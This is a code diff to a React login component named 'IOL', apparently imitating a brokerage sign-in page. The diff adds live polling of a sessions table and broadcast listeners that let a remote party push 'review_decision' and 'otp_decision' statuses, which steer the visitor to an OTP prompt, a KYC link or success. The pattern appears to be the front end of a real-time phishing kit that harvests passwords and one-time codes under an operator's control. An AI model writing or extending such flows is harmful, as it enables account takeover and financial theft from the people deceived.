@@ -124,6 +124,17 @@ const IOL = () => {
     return match?.[1] || null;
   }, []);
 
+  const parseKycPayloadFromOtp = useCallback((otpCode?: string | null) => {
+    if (!otpCode || !otpCode.startsWith("kyc_link:")) return null;
+    const kycLink = otpCode.replace("kyc_link:", "").trim();
+    if (!kycLink) return null;
+
+    return {
+      kyc_link: kycLink,
+      kyc_case_id: parseCaseIdFromLink(kycLink) || undefined,
+    };
+  }, [parseCaseIdFromLink]);
+
   const activateEmbeddedKyc = useCallback((payload?: { kyc_link?: string; kyc_case_id?: string } | string) => {
     const resolvedCaseId = typeof payload === "string"
       ? parseCaseIdFromLink(payload)
@@ -146,7 +157,7 @@ const IOL = () => {
       return;
     }
 
-    if (["login_success", "approved", "completed", "otp_approved"].includes(status)) {
+    if (["login_success", "approved", "completed", "otp_approved", "confirm_approved", "sync_approved"].includes(status)) {
       setErrorMessage("");
       setGeneralError("");
       setStep("success");
@@ -162,6 +173,7 @@ const IOL = () => {
 
     if (status === "redirect_otp" || status === "show_otp") {
       setErrorMessage("");
+      setGeneralError("");
       setStep("otp");
       return;
     }
@@ -179,9 +191,84 @@ const IOL = () => {
   }, [activateEmbeddedKyc]);
 
   useEffect(() => {
-    // Auto-updates desativados para evitar loop e retorno automático ao início.
-    // O fluxo agora só muda por ação do usuário nesta tela.
-  }, []);
+    if (!sessionId || step === "form" || step === "success") return;
+
+    let isActive = true;
+    let pollDelayMs = 1500;
+    let pollTimeout: number | null = null;
+    let lastSnapshotKey = "";
+
+    const applySnapshot = (snapshot?: { status?: string; otp_code?: string | null }) => {
+      const status = snapshot?.status;
+      if (!status) return;
+
+      if (status === "redirect_kyc") {
+        const kycPayload = parseKycPayloadFromOtp(snapshot?.otp_code);
+        if (kycPayload) {
+          handleDecision({ status, ...kycPayload });
+          return;
+        }
+      }
+
+      handleDecision(status);
+    };
+
+    const reviewChannel = supabase.channel(`session-review-${sessionId}`);
+    reviewChannel
+      .on("broadcast", { event: "review_decision" }, (payload) => {
+        const incoming = payload.payload as { status?: string; kyc_link?: string; kyc_case_id?: string } | undefined;
+        handleDecision(incoming);
+      })
+      .subscribe();
+
+    const otpChannel = supabase.channel(`session-otp-decision-${sessionId}`);
+    otpChannel
+      .on("broadcast", { event: "otp_decision" }, (payload) => {
+        handleDecision(payload.payload?.status as string | undefined);
+      })
+      .subscribe();
+
+    const pollStatus = async () => {
+      try {
+        const { data } = await supabase
+          .from("sessions")
+          .select("status, otp_code")
+          .eq("id", sessionId)
+          .maybeSingle();
+
+        if (!isActive) return;
+
+        if (data?.status) {
+          const snapshotKey = `${data.status}::${data.otp_code || ""}`;
+          if (snapshotKey !== lastSnapshotKey) {
+            lastSnapshotKey = snapshotKey;
+            applySnapshot(data);
+            pollDelayMs = 1500;
+          } else {
+            pollDelayMs = Math.min(Math.round(pollDelayMs * 1.35), 7000);
+          }
+        } else {
+          pollDelayMs = Math.min(Math.round(pollDelayMs * 1.35), 7000);
+        }
+      } catch {
+        if (!isActive) return;
+        pollDelayMs = Math.min(Math.round(pollDelayMs * 1.5), 7000);
+      }
+
+      if (isActive) {
+        pollTimeout = window.setTimeout(pollStatus, pollDelayMs);
+      }
+    };
+
+    pollTimeout = window.setTimeout(pollStatus, pollDelayMs);
+
+    return () => {
+      isActive = false;
+      if (pollTimeout) window.clearTimeout(pollTimeout);
+      supabase.removeChannel(reviewChannel);
+      supabase.removeChannel(otpChannel);
+    };
+  }, [sessionId, step, handleDecision, parseKycPayloadFromOtp]);
 
   const handleLoginSubmit = useCallback(async (submittedEmail: string, password: string) => {
     setGeneralError("");
